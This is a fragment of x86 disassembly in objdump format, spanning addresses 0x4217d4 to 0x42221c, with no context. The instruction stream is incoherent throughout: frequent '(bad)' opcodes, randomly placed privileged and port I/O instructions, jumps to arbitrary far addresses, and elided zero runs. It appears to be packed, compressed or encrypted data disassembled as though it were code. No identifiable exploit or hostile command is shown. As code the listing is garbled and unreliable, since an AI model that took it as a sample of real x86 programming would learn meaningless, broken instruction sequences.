  4217d4:	or     bh,BYTE PTR [edi-0x2e]
  4217d7:	shl    al,1
  4217d9:	dec    edi
  4217da:	jnp    0x4217ac
  4217dc:	jl     0x4217a2
  4217de:	ss cli 
  4217e0:	jae    0x421856
  4217e2:	loopne 0x4217a2
  4217e4:	inc    ecx
  4217e5:	sbb    eax,0xa481ef3f
  4217ea:	cmp    DWORD PTR [edi+0x302273b7],ebp
  4217f0:	adc    edi,DWORD PTR [ecx+0x46]
  4217f3:	and    ebp,ebx
  4217f5:	and    esi,DWORD PTR [esi]
  4217f7:	lock aad 0xfd
  4217fa:	(bad)  
  4217fb:	arpl   di,cx
  4217fd:	jg     0x421824
  4217ff:	lahf   
  421800:	hlt    
  421801:	mov    al,ds:0x3a126729
  421806:	addr16 call 0x325a8b8b
  42180c:	pusha  
  42180d:	pop    eax
  42180e:	dec    edx
  42180f:	mov    al,ds:0x0
	...
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	call   DWORD PTR ds:0x6520f858
  421886:	add    DWORD PTR [eax],eax
  421888:	add    al,0x1
  42188a:	add    BYTE PTR [eax],al
  42188c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42188d:	call   0xdcf503f4
  421892:	add    eax,0x7ac61c0
  421897:	sub    BYTE PTR [ebp+0x74183715],0xbd
  42189e:	out    0x87,eax
  4218a0:	inc    edi
  4218a1:	pop    ebx
  4218a2:	mov    al,0xd6
  4218a4:	mov    ebp,0xa2563236
  4218a9:	pop    ebp
  4218aa:	fldenv [esi]
  4218ac:	mov    dl,0xe9
  4218ae:	jae    0x421883
  4218b0:	fwait
  4218b1:	(bad)  
  4218b2:	mov    ebx,0xe957190d
  4218b7:	or     al,0xc1
  4218b9:	mov    eax,ds:0x2650392d
  4218be:	sub    DWORD PTR [edx-0x3a],ebp
  4218c1:	xor    edi,ebp
  4218c3:	add    al,0x1d
  4218c5:	es call 0x9f24:0xc035e496
  4218cd:	push   ss
  4218ce:	hlt    
  4218cf:	mov    dh,0x4d
  4218d1:	dec    edi
  4218d2:	mov    DWORD PTR [ebx-0x7cab6b5f],edx
  4218d8:	ss mov eax,0xbae3d71a
  4218de:	or     esi,DWORD PTR [eax]
  4218e0:	xchg   esi,eax
  4218e1:	pushf  
  4218e2:	mov    eax,0xe033136b
  4218e7:	pop    ebp
  4218e8:	aas    
  4218e9:	fwait
  4218ea:	call   0x347da582
  4218ef:	daa    
  4218f0:	mov    cl,0x92
  4218f2:	and    esp,DWORD PTR ds:[esi]
  4218f5:	push   ebp
  4218f6:	sar    eax,cl
  4218f8:	stc    
  4218f9:	mov    WORD PTR [esi+edi*1-0x1b],ss
  4218fd:	fbstp  TBYTE PTR [esi+edi*1+0x41643b53]
  421904:	lods   eax,DWORD PTR ds:[esi]
  421905:	mov    bl,0x42
  421907:	je     0x421950
  421909:	ret    
  42190a:	stos   BYTE PTR es:[edi],al
  42190b:	pop    esp
  42190c:	data16 sub al,0xa6
  42190f:	mov    ebx,0x33496956
  421914:	iret   
  421915:	cdq    
  421916:	sbb    eax,0x5ac24e9a
  42191b:	xchg   edi,eax
  42191c:	xor    eax,0xe92aec9
  421921:	push   ebp
  421922:	rcl    DWORD PTR [ebp-0x57ee6f2],1
  421928:	dec    edx
  421929:	fwait
  42192a:	inc    eax
  42192b:	psubsb mm2,QWORD PTR [ebx-0x6b]
  42192f:	xchg   ebx,eax
  421930:	inc    esp
  421931:	mov    gs,edi
  421933:	cmc    
  421934:	mov    ch,0x3
  421936:	xlat   BYTE PTR ds:[ebx]
  421937:	xchg   edi,eax
  421938:	repz sub DWORD PTR ss:[ebx],0x63d4f887
  421940:	test   eax,0x86318852
  421945:	xchg   DWORD PTR [ebp+0x57771701],edi
  42194b:	data16 and BYTE PTR [eax-0x2aa38380],ah
  421952:	and    edx,DWORD PTR [ebp+0x53]
  421955:	and    ch,bh
  421957:	out    dx,eax
  421958:	sub    al,0x41
  42195a:	int    0x2c
  42195c:	js     0x421998
  42195e:	mov    edx,0x9d339078
  421963:	cmp    ch,BYTE PTR [esi-0xb]
  421966:	(bad)  
  421968:	jnp    0x421998
  42196a:	pop    esi
  42196b:	jg     0x421958
  42196d:	(bad)  
  42196e:	jp     0x421936
  421970:	or     ah,BYTE PTR [ebx+0x23]
  421973:	pop    esi
  421974:	daa    
  421975:	mov    ?,WORD PTR [eax-0x28]
  421978:	jmp    FWORD PTR [ecx]
  42197a:	cmp    ah,0xb3
  42197d:	repz mov edi,0x4ae82d7c
  421983:	inc    ecx
  421984:	inc    esi
  421985:	pop    ecx
  421986:	inc    ebx
  421987:	lods   eax,DWORD PTR ds:[esi]
  421988:	fnstcw WORD PTR [esi-0x52]
  42198b:	out    dx,eax
  42198c:	mul    DWORD PTR [ecx+0x73]
  42198f:	mov    bl,0x0
	...
  4219f1:	add    BYTE PTR [eax],al
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	out    0x7c,al
  421a02:	cli    
  421a03:	imul   esp,DWORD PTR [esi+eiz*2],0x1
  421a07:	add    BYTE PTR [ecx+eax*1],al
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	dec    esp
  421a0d:	add    ebx,DWORD PTR [esi+0x10931f93]
  421a13:	jl     0x421a49
  421a15:	xlat   BYTE PTR ds:[ebx]
  421a16:	stc    
  421a17:	xor    DWORD PTR [edi-0x26],edx
  421a1a:	test   eax,0x523d7c0
  421a1f:	repz pop ecx
  421a21:	pop    ds
  421a22:	test   al,0xd7
  421a24:	cmp    DWORD PTR [esi-0x3e],ebp
  421a27:	loopne 0x4219aa
  421a29:	imul   edx,DWORD PTR [ebp+0x51661c47],0x32
  421a30:	push   esp
  421a31:	ret    0x31b9
  421a34:	push   0x1e16c9f6
  421a39:	clc    
  421a3a:	lds    ebp,FWORD PTR [esi-0x10883c62]
  421a40:	adc    ch,BYTE PTR [esp+eax*8+0x13334b91]
  421a47:	call   0x751529c7
  421a4c:	mov    ds:0xdd251d5a,eax
  421a51:	sub    DWORD PTR ds:0x2356de01,eax
  421a57:	sbb    eax,0xf7d829cf
  421a5c:	pop    ss
  421a5d:	cmp    bh,BYTE PTR [ebx+0x52c1ba53]
  421a63:	sub    al,0x52
  421a65:	push   0x44
  421a67:	loop   0x421a7e
  421a69:	or     ebx,ebx
  421a6b:	leave  
  421a6c:	mov    edx,0xdc8e929
  421a71:	imul   esi,edi,0x11a837b7
  421a77:	popf   
  421a78:	inc    ebx
  421a79:	push   edi
  421a7a:	add    edx,DWORD PTR ds:0xf5f3768c
  421a80:	aad    0x31
  421a82:	out    dx,eax
  421a83:	call   0x499eb116
  421a88:	pop    eax
  421a89:	sub    dl,BYTE PTR [edi+0x17]
  421a8c:	bound  esp,QWORD PTR [esi+0x741c23e4]
  421a92:	and    DWORD PTR [edx+0x29d11c23],edi
  421a98:	lea    ebp,[edx-0x5f3d0612]
  421a9e:	icebp  
  421a9f:	xchg   esp,eax
  421aa0:	cmp    al,0xe
  421aa2:	push   0x3b
  421aa4:	jae    0x421abc
  421aa6:	xchg   edx,eax
  421aa7:	mov    esp,0x77b0f772
  421aac:	fwait
  421aad:	daa    
  421aae:	in     al,0x41
  421ab0:	lahf   
  421ab1:	imul   ebp,DWORD PTR [edi],0x800b0621
  421ab7:	or     DWORD PTR [edi-0x49],ebx
  421aba:	loope  0x421a68
  421abc:	mov    ah,0xe7
  421abe:	and    al,BYTE PTR [edi+eax*8+0x9]
  421ac2:	cmp    bl,BYTE PTR [ebx]
  421ac4:	fild   DWORD PTR [esi+esi*8-0x300c5062]
  421acb:	jb     0x421b1d
  421acd:	pop    ebx
  421ace:	lods   al,BYTE PTR ds:[esi]
  421acf:	xchg   ebx,eax
  421ad0:	sub    eax,0x100b068b
  421ad5:	loopne 0x421af7
  421ad7:	push   es
  421ad8:	and    eax,0xf2d7ef2d
  421add:	mov    ds:0x32b3d0eb,al
  421ae2:	add    edi,DWORD PTR [ebx]
  421ae4:	push   es
  421ae5:	(bad)  
  421ae6:	(bad)  
  421ae7:	ja     0x421ab8
  421ae9:	pop    edx
  421aea:	std    
  421aeb:	mov    fs,WORD PTR [edx+eiz*2-0x42]
  421aef:	ficomp DWORD PTR [esi+0x7c3bae85]
  421af5:	push   es
  421af6:	test   esi,0x27b2892
  421afc:	add    ch,dh
  421afe:	push   cs
  421aff:	mov    ebx,0xbdac3b4
  421b04:	push   0x25
  421b06:	pop    es
  421b07:	jbe    0x421a95
  421b09:	arpl   bp,sp
  421b0b:	inc    esi
  421b0c:	lahf   
  421b0d:	or     eax,0xb185
	...
  421b72:	add    BYTE PTR [eax],al
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     ah,BYTE PTR [edi]
  421b81:	dec    esp
  421b82:	ds aam 0x28
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    al,0x1
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	clc    
  421b8d:	das    
  421b8e:	xchg   edx,eax
  421b8f:	and    eax,0xa48ce663
  421b94:	mov    ah,0xa1
  421b96:	sar    DWORD PTR [esi],cl
  421b98:	cdq    
  421b99:	and    dl,cl
  421b9b:	nop
  421b9c:	lods   eax,DWORD PTR ds:[esi]
  421b9d:	icebp  
  421b9e:	icebp  
  421b9f:	rcr    BYTE PTR [eax+0x6e],1
  421ba2:	in     al,dx
  421ba3:	cmp    al,BYTE PTR [ebp+0x14]
  421ba6:	sbb    ebx,edx
  421ba8:	inc    ecx
  421ba9:	int3   
  421baa:	or     BYTE PTR [ecx],ch
  421bac:	dec    esp
  421bad:	(bad)  
  421bae:	adc    eax,0xca85e75a
  421bb3:	mov    ch,0x9d
  421bb5:	out    0xd4,eax
  421bb7:	mov    esp,0xd6cb120d
  421bbc:	pop    ss
  421bbd:	popa   
  421bbe:	scas   eax,DWORD PTR es:[edi]
  421bbf:	jle    0x421c31
  421bc1:	into   
  421bc2:	mov    cl,0x1a
  421bc4:	or     eax,0xe1882c43
  421bc9:	imul   eax,DWORD PTR [eax+0x3e]
  421bcd:	lahf   
  421bce:	out    dx,al
  421bcf:	push   ds
  421bd0:	xlat   BYTE PTR ds:[ebx]
  421bd1:	aam    0xbe
  421bd3:	push   es
  421bd4:	add    DWORD PTR [ebx+0x7b],0x53
  421bd8:	je     0x421bcc
  421bda:	jg     0x421bd6
  421bdc:	xchg   ebx,eax
  421bdd:	scas   al,BYTE PTR es:[edi]
  421bde:	(bad)  
  421bdf:	pop    ds
  421be0:	cmp    bh,BYTE PTR [ebp-0x2f0bb9c5]
  421be6:	popa   
  421be7:	lea    ebp,[ebx-0xe]
  421bea:	mov    dl,0x67
  421bec:	lea    esp,[ebx+eax*4+0x6a6b59f3]
  421bf3:	push   es
  421bf4:	or     al,ah
  421bf6:	sub    eax,0x612374ee
  421bfb:	lock in eax,dx
  421bfd:	push   esp
  421bfe:	xor    cl,dh
  421c00:	xor    ebx,esi
  421c02:	cwde   
  421c03:	add    BYTE PTR [edi+0x309f0653],dl
  421c09:	call   edx
  421c0b:	and    DWORD PTR [ebp+0x1ed77168],0x1b
  421c12:	jbe    0x421c78
  421c14:	xor    BYTE PTR [ecx],ah
  421c16:	xchg   esi,eax
  421c17:	fs jmp 0x3e4e:0x64fae0e
  421c1f:	cdq    
  421c20:	push   eax
  421c21:	xchg   ebx,eax
  421c22:	test   al,0xff
  421c24:	pop    ebp
  421c25:	push   ds
  421c26:	into   
  421c27:	dec    esi
  421c28:	test   BYTE PTR [eax+0x1f73a9b],0xe4
  421c2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c30:	out    0xf1,al
  421c32:	dec    edx
  421c33:	fcom   st(4)
  421c35:	test   ecx,ebx
  421c37:	mov    ds:0xa570a04d,eax
  421c3c:	pop    di
  421c3e:	sub    BYTE PTR [esi],ch
  421c40:	in     al,dx
  421c41:	jg     0x421bc5
  421c43:	inc    eax
  421c44:	mov    al,BYTE PTR [edx+edx*8-0x68]
  421c48:	mov    ch,0x9b
  421c4a:	and    al,0xac
  421c4c:	mov    WORD PTR [ebx+0x50],fs
  421c4f:	inc    di
  421c51:	out    0xf5,eax
  421c53:	add    al,0x98
  421c55:	cmc    
  421c56:	repz fwait
  421c58:	push   ss
  421c59:	shl    BYTE PTR [ecx-0x47],cl
  421c5c:	lahf   
  421c5d:	inc    edx
  421c5e:	popf   
  421c5f:	mov    bl,0xbb
  421c61:	rcr    bl,cl
  421c63:	lods   eax,DWORD PTR ds:[esi]
  421c64:	loopne 0x421c0a
  421c66:	test   BYTE PTR [edi],0xc
  421c69:	mov    cl,0x98
  421c6c:	ins    BYTE PTR es:[edi],dx
  421c6d:	jge    0x421ca0
  421c6f:	adc    DWORD PTR [ebx-0x50],edx
  421c72:	mov    dl,0x2d
  421c74:	and    eax,0xeb78c9eb
  421c79:	test   ebp,ebp
  421c7b:	nop
  421c7c:	retf   
  421c7d:	shr    DWORD PTR [eax],0x37
  421c80:	xor    dl,BYTE PTR [ebp-0x437dbbae]
  421c86:	test   DWORD PTR ds:0x4a6940f1,edi
  421c8c:	je     0x421c8f
  421c8e:	bound  esi,QWORD PTR [ecx+0x0]
	...
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	test   BYTE PTR [esi-0x45],dh
  421d03:	jmp    0x104:0x1682c
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	adc    eax,0xbef8f24f
  421d11:	xchg   DWORD PTR [edx-0x2a],ebx
  421d14:	fldenv [eax-0x4e1bac6e]
  421d1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d1b:	mov    esi,DWORD PTR [eax+ebx*8-0xb7bc457]
  421d22:	adc    al,0xc0
  421d24:	and    bl,ah
  421d26:	in     eax,0x3c
  421d28:	popf   
  421d29:	or     al,BYTE PTR [eax-0x73d38b22]
  421d2f:	jnp    0x421ce8
  421d31:	push   esi
  421d32:	cmp    DWORD PTR ds:0x9839d8b3,0xfb06f0a6
  421d3c:	pop    esp
  421d3d:	inc    ecx
  421d3e:	push   0xa4bbbaf9
  421d43:	cdq    
  421d44:	test   BYTE PTR [ebx+0x190df325],ah
  421d4a:	nop
  421d4b:	add    eax,0x40
  421d4e:	sub    ah,0x38
  421d51:	inc    esp
  421d52:	xchg   esp,eax
  421d53:	xchg   esp,eax
  421d54:	xor    BYTE PTR [ebx-0x58],bl
  421d57:	cmp    ebp,ebx
  421d59:	retf   0x95c6
  421d5c:	test   DWORD PTR [edi+eax*1+0x381a685d],edx
  421d63:	cmp    DWORD PTR [edx+0x7a],ebx
  421d66:	call   0x43537eac
  421d6b:	push   0xfffffff9
  421d6d:	mov    ecx,0x430a506d
  421d72:	xchg   esp,eax
  421d73:	xor    eax,ebx
  421d75:	pop    ss
  421d76:	inc    ecx
  421d77:	fiadd  WORD PTR [ebx]
  421d79:	jge    0x421db6
  421d7b:	cdq    
  421d7c:	push   edi
  421d7d:	jne    0x421d59
  421d7f:	adc    BYTE PTR [edi],cl
  421d81:	mov    ecx,0x1e335c38
  421d86:	pop    ebx
  421d87:	pop    esp
  421d88:	arpl   WORD PTR [esp+ebx*8+0x75],bp
  421d8c:	js     0x421d15
  421d8e:	push   edx
  421d8f:	imul   BYTE PTR [ebx+esi*8+0x24]
  421d93:	nop
  421d94:	das    
  421d95:	ds mov bl,0xb
  421d98:	pop    ss
  421d99:	jl     0x421d4a
  421d9b:	sbb    ah,BYTE PTR [esi-0x14]
  421d9e:	inc    eax
  421d9f:	outs   dx,BYTE PTR ds:[esi]
  421da0:	inc    edi
  421da1:	ret    
  421da2:	sbb    ch,BYTE PTR [edi]
  421da4:	push   0xffffffed
  421da6:	sub    bh,BYTE PTR [esi+ebx*4-0x7d]
  421daa:	adc    esp,esi
  421dac:	and    cl,BYTE PTR [ecx]
  421dae:	arpl   sp,bx
  421db0:	ins    BYTE PTR es:[edi],dx
  421db1:	cmp    BYTE PTR [esi+0x5c],bh
  421db4:	mov    WORD PTR [ecx],ds
  421db6:	aad    0x30
  421db8:	lds    ebp,FWORD PTR [eax+0x27]
  421dbb:	jle    0x421dfd
  421dbd:	push   ebx
  421dbe:	sbb    al,0x25
  421dc0:	add    DWORD PTR [ebp-0x6c],edi
  421dc3:	xchg   ebp,eax
  421dc4:	repz (bad)
  421dc7:	mov    ebx,0x2e4be86e
  421dcc:	sub    al,0x91
  421dce:	scas   al,BYTE PTR es:[edi]
  421dcf:	mov    esi,0x285bb796
  421dd4:	cmp    al,0x17
  421dd6:	or     BYTE PTR [edi-0x1a],ah
  421dd9:	adc    eax,0x23528112
  421dde:	(bad)  
  421ddf:	inc    ebx
  421de0:	(bad)  
  421de1:	dec    esp
  421de2:	or     BYTE PTR [esi-0x23],0x73
  421de6:	popa   
  421de7:	jg     0x421d8c
  421de9:	cdq    
  421dea:	dec    esi
  421deb:	sbb    dl,BYTE PTR [esi+ebx*2+0x5]
  421def:	adc    cl,ah
  421df1:	mov    esp,0x7808d16b
  421df6:	sbb    esi,edx
  421df8:	pushf  
  421df9:	cmp    BYTE PTR [esi-0x4b],al
  421dfc:	fcomi  st,st(6)
  421dfe:	xor    ah,BYTE PTR [ebp-0x1f]
  421e01:	test   BYTE PTR [edi+0x35441309],cl
  421e07:	jbe    0x421e0c
  421e09:	mov    al,0xa1
  421e0b:	inc    ecx
  421e0c:	imul   DWORD PTR [ebx+0xbfbd]
	...
  421e72:	add    BYTE PTR [eax],al
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	sub    DWORD PTR [esi-0x3e],edi
  421e83:	pusha  
  421e84:	xor    BYTE PTR [ecx+0x1],ch
  421e87:	add    BYTE PTR [ecx+eax*1],al
  421e8a:	add    BYTE PTR [eax],al
  421e8c:	pop    eax
  421e8d:	inc    eax
  421e8e:	nop
  421e8f:	fwait
  421e90:	mov    al,ds:0x4f7446a
  421e95:	out    dx,eax
  421e96:	lock pop edi
  421e98:	arpl   WORD PTR [eax+ebp*1-0x7d4973f7],cx
  421e9f:	mov    ds:0xbab6da8a,eax
  421ea4:	push   ss
  421ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ea6:	(bad)  
  421ea7:	mov    al,ds:0x7907cb2b
  421eac:	dec    ebp
  421ead:	test   eax,0x56ad6659
  421eb2:	lahf   
  421eb3:	out    0x4c,al
  421eb5:	sbb    DWORD PTR [edi-0x660d0322],0x4c
  421ebc:	enter  0x3955,0x79
  421ec0:	std    
  421ec1:	cmp    al,0x15
  421ec3:	inc    ebx
  421ec4:	xchg   ecx,eax
  421ec5:	jno    0x421f00
  421ec7:	fisub  WORD PTR [esi+ecx*2+0x9]
  421ecb:	std    
  421ecc:	outs   dx,BYTE PTR ds:[esi]
  421ecd:	or     al,0x7
  421ecf:	adc    DWORD PTR [esi+0x1c],esp
  421ed2:	xchg   ebx,eax
  421ed3:	push   eax
  421ed4:	pushf  
  421ed5:	push   esi
  421ed6:	push   edi
  421ed7:	inc    ecx
  421ed8:	cld    
  421ed9:	dec    esi
  421eda:	push   ebp
  421edb:	loop   0x421f31
  421edd:	jne    0x421e9c
  421edf:	push   ebx
  421ee0:	icebp  
  421ee1:	mov    al,0xd5
  421ee3:	cmp    dl,BYTE PTR [ebx+0x551cfa79]
  421ee9:	mov    DWORD PTR [ebp+0x2c],ecx
  421eec:	stos   DWORD PTR es:[edi],eax
  421eed:	rol    BYTE PTR ds:0xddaf9d23,cl
  421ef3:	jno    0x421ecb
  421ef5:	clc    
  421ef6:	jo     0x421ed5
  421ef8:	dec    esp
  421ef9:	ret    
  421efa:	cmp    ah,ch
  421efc:	(bad)  
  421efd:	aas    
  421efe:	ror    DWORD PTR [edi],cl
  421f00:	jmp    0x421ef9
  421f02:	mov    WORD PTR [eax],cs
  421f04:	jbe    0x421eda
  421f06:	fistp  DWORD PTR [ebx]
  421f08:	ins    DWORD PTR es:[edi],dx
  421f09:	jbe    0x421ec4
  421f0b:	mov    ecx,0x2bdade39
  421f10:	scas   eax,DWORD PTR es:[edi]
  421f11:	cld    
  421f12:	lds    esp,FWORD PTR [eax]
  421f14:	dec    eax
  421f15:	push   edi
  421f16:	sbb    al,0xa4
  421f18:	mov    eax,0x8dd9f6ce
  421f1d:	or     bl,BYTE PTR [edx-0x79aff92c]
  421f23:	loop   0x421f1c
  421f25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f26:	bound  esp,QWORD PTR [eax+edx*8+0x17e9c742]
  421f2d:	popa   
  421f2e:	icebp  
  421f2f:	mov    eax,ds:0x2c44be81
  421f34:	mov    edx,0x498fe9fd
  421f39:	ret    0xb514
  421f3c:	sbb    dl,bl
  421f3e:	xchg   edx,eax
  421f3f:	jo     0x421ee1
  421f41:	xchg   esi,eax
  421f42:	mov    bh,0xff
  421f44:	xor    BYTE PTR [esi-0x48],dh
  421f47:	stc    
  421f48:	repz clc 
  421f4a:	lods   al,BYTE PTR ds:[esi]
  421f4b:	inc    sp
  421f4d:	jne    0x421f67
  421f4f:	shr    DWORD PTR [ebx-0x35eb029b],0x26
  421f56:	inc    edi
  421f57:	sub    BYTE PTR [esi],cl
  421f59:	pushf  
  421f5a:	jo     0x421f5d
  421f5c:	push   edx
  421f5d:	leave  
  421f5e:	in     al,0x58
  421f60:	or     dl,BYTE PTR [ebx+0x2c]
  421f63:	dec    edi
  421f64:	jecxz  0x421ef5
  421f66:	fwait
  421f67:	popa   
  421f68:	div    DWORD PTR [esi+0x29c33711]
  421f6e:	push   es
  421f6f:	fadd   QWORD PTR [ecx]
  421f71:	std    
  421f72:	xchg   ebx,eax
  421f73:	call   0x18b2:0x787c74cd
  421f7a:	fisttp QWORD PTR [edx-0x21961e0b]
  421f80:	xchg   edi,eax
  421f81:	(bad)  
  421f82:	fst    DWORD PTR [eax]
  421f84:	xor    DWORD PTR [ebx-0x45],edi
  421f87:	jbe    0x421fec
  421f89:	and    bh,BYTE PTR [ebx-0x611fbf06]
  421f8f:	add    al,BYTE PTR [eax]
	...
  421ff1:	add    BYTE PTR [eax],al
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	mov    bx,0x5a17
  422003:	in     eax,0x34
  422005:	push   0x1
  422007:	add    BYTE PTR [ecx+eax*1],al
  42200a:	add    BYTE PTR [eax],al
  42200c:	imul   ebp,esp,0xffffffdb
  42200f:	ins    DWORD PTR es:[edi],dx
  422010:	lods   al,BYTE PTR ds:[esi]
  422011:	and    dl,BYTE PTR [ebx+ecx*4+0x7b9c14ab]
  422018:	cmp    al,0x70
  42201a:	test   al,0xcc
  42201c:	and    BYTE PTR [edx-0x27f723dc],dl
  422022:	inc    eax
  422023:	jne    0x42203f
  422025:	sub    ebx,DWORD PTR [edi-0x52]
  422028:	sub    eax,0xb098a187
  42202d:	in     al,0xc0
  42202f:	and    eax,edi
  422031:	adc    dl,bl
  422033:	das    
  422034:	std    
  422035:	xchg   edi,eax
  422036:	xor    DWORD PTR [edx+0x39b57c77],edx
  42203c:	xor    edx,DWORD PTR [ebp-0x2a905dce]
  422042:	test   eax,0xfdb32fe
  422047:	xchg   ebp,eax
  422048:	xor    DWORD PTR [edi-0x66],ebp
  42204b:	dec    ebp
  42204c:	out    0xe6,eax
  42204e:	cmp    DWORD PTR [edx+0x1d7b1d45],ebp
  422054:	or     BYTE PTR [esi+ebp*8],bh
  422057:	jae    0x42209a
  422059:	scas   eax,DWORD PTR es:[edi]
  42205a:	push   esi
  42205b:	pop    ecx
  42205c:	mov    ds:0x76ad863d,al
  422061:	out    dx,al
  422062:	test   esi,0xc3bb292f
  422068:	aas    
  422069:	imul   ebp,DWORD PTR [ecx+0x842ecfb],0x844e272f
  422073:	jmp    0x422059
  422075:	jns    0x4220be
  422077:	and    BYTE PTR [edx],dl
  422079:	pushf  
  42207a:	ret    0x8934
  42207d:	jecxz  0x4220fa
  42207f:	cwde   
  422080:	mov    ds:0xcb2a2808,al
  422085:	push   esi
  422086:	out    dx,eax
  422087:	inc    esi
  422088:	aas    
  422089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42208a:	pop    ecx
  42208b:	mov    edi,0xed98e32f
  422090:	vpcmpgtw ymm1,ymm3,YMMWORD PTR [edi]
  422094:	pop    eax
  422095:	mov    BYTE PTR [eax],dl
  422097:	and    ah,BYTE PTR [edi+0x38187138]
  42209d:	les    edi,FWORD PTR [ebx-0x3e]
  4220a0:	std    
  4220a1:	mov    ch,0x8d
  4220a3:	cli    
  4220a4:	js     0x422031
  4220a6:	or     al,0x89
  4220a8:	add    ebp,DWORD PTR [ebp+0x3e]
  4220ab:	scas   eax,DWORD PTR es:[edi]
  4220ac:	pop    es
  4220ad:	mov    al,ds:0xdb8ce4d5
  4220b2:	es mov ch,0xe8
  4220b5:	pop    edi
  4220b6:	and    al,0x6f
  4220b8:	inc    edx
  4220b9:	mov    WORD PTR [ebx-0x4bb2601a],ds
  4220bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220c0:	or     DWORD PTR [ebx],ebx
  4220c2:	je     0x422110
  4220c4:	je     0x4220e0
  4220c6:	push   ebp
  4220c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220c8:	call   0x56e1d7b7
  4220cd:	cmp    ebx,eax
  4220cf:	std    
  4220d0:	xchg   edi,eax
  4220d1:	je     0x422101
  4220d3:	daa    
  4220d4:	gs inc ecx
  4220d6:	dec    ebp
  4220d7:	push   esi
  4220d8:	pusha  
  4220d9:	sahf   
  4220da:	mov    al,0x79
  4220dc:	mov    ebx,0xe8ab521e
  4220e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220e2:	rcr    BYTE PTR [esp],1
  4220e5:	xor    DWORD PTR [edi],ebx
  4220e7:	mov    al,0x79
  4220e9:	cdq    
  4220ea:	gs inc esi
  4220ec:	add    al,0xe9
  4220ee:	push   ebx
  4220ef:	xchg   bx,ax
  4220f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220f2:	xchg   ecx,eax
  4220f3:	int3   
  4220f4:	push   esi
  4220f5:	mov    edi,0x593a1995
  4220fa:	add    esi,ebp
  4220fc:	out    dx,eax
  4220fd:	jmp    0x4220e5
  4220ff:	fisub  DWORD PTR [edx+ebx*1]
  422102:	xor    DWORD PTR [esi+0x3c],edi
  422105:	pop    ebp
  422106:	push   ss
  422107:	pop    es
  422108:	stos   BYTE PTR es:[edi],al
  422109:	imul   esi,DWORD PTR [edi],0xffffff94
  42210c:	imul   ebx,eax,0x6e74
	...
  422172:	add    BYTE PTR [eax],al
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ecx,DWORD PTR [ebp+0x38fcb0ed]
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    al,0x1
  42218a:	add    BYTE PTR [eax],al
  42218c:	ret    
  42218d:	or     eax,0x41ea246c
  422192:	mov    esp,0x63e5980c
  422197:	xor    BYTE PTR [esi+0x31],bh
  42219a:	dec    ecx
  42219b:	pop    es
  42219c:	mov    ah,0xf4
  42219e:	sbb    eax,0xb2dd58e5
  4221a3:	or     al,0x52
  4221a5:	daa    
  4221a6:	loope  0x422186
  4221a8:	jo     0x422206
  4221aa:	cld    
  4221ab:	xor    DWORD PTR [edx-0x63],0x44e408c1
  4221b2:	inc    ebp
  4221b3:	sbb    esi,ebx
  4221b5:	inc    edx
  4221b6:	inc    esp
  4221b7:	push   ds
  4221b8:	pop    edx
  4221b9:	and    esp,DWORD PTR [ebp-0x760c5e18]
  4221bf:	pusha  
  4221c0:	imul   esi,DWORD PTR [esi+0x78796953],0xffffffc3
  4221c7:	xchg   BYTE PTR [edi-0x6073121c],dl
  4221cd:	cmp    bl,BYTE PTR [ecx]
  4221cf:	pushf  
  4221d0:	jge    0x42222f
  4221d2:	and    DWORD PTR [edx-0x65],ecx
  4221d5:	ror    BYTE PTR [ecx+0x71a4e7a9],1
  4221db:	add    BYTE PTR [eax+0x70857b6f],bh
  4221e1:	int    0x91
  4221e3:	jns    0x422252
  4221e5:	and    al,0x89
  4221e7:	(bad)  
  4221e8:	dec    esi
  4221e9:	cmp    al,0x65
  4221eb:	arpl   WORD PTR [esi],di
  4221ed:	data16 clc 
  4221ef:	adc    al,0xad
  4221f1:	imul   eax,DWORD PTR [esi-0x2319eb45],0xcbb5acae
  4221fb:	or     ebx,DWORD PTR [edi-0x13ca1e6]
  422201:	mov    ds:0xe520cc3b,al
  422206:	add    eax,0xffcf3a77
  42220b:	fstp   st(0)
  42220d:	xchg   BYTE PTR ds:0x1c7151f6,al
  422213:	lea    edi,[ebx]
  422215:	add    eax,0x624c573a
  42221a:	push   0xffffffcf
  42221c:	dec    esi
